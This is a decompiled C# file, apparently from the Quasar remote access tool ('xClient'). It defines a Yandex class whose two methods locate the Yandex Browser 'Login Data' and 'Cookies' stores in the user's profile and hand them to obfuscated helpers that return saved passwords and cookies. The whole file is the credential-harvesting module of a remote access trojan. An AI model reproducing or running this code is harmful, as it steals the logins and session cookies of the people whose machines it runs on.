using System;
using System.Collections.Generic;
using System.IO;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000D2 RID: 210
	public class Yandex
	{
		// Token: 0x06000539 RID: 1337 RVA: 0x00012AB4 File Offset: 0x00010CB4
		public static List<GClass32> GetSavedPasswords()
		{
			List<GClass32> result;
			try
			{
				string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
				result = GClass29.smethod_0(datapath, "Yandex");
			}
			catch (Exception)
			{
				result = new List<GClass32>();
			}
			return result;
		}

		// Token: 0x0600053A RID: 1338 RVA: 0x00012AFC File Offset: 0x00010CFC
		public static List<GClass29.GClass30> GetSavedCookies()
		{
			List<GClass29.GClass30> result;
			try
			{
				string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
				result = GClass29.smethod_1(dataPath, "Yandex");
			}
			catch (Exception)
			{
				result = new List<GClass29.GClass30>();
			}
			return result;
		}
	}
}
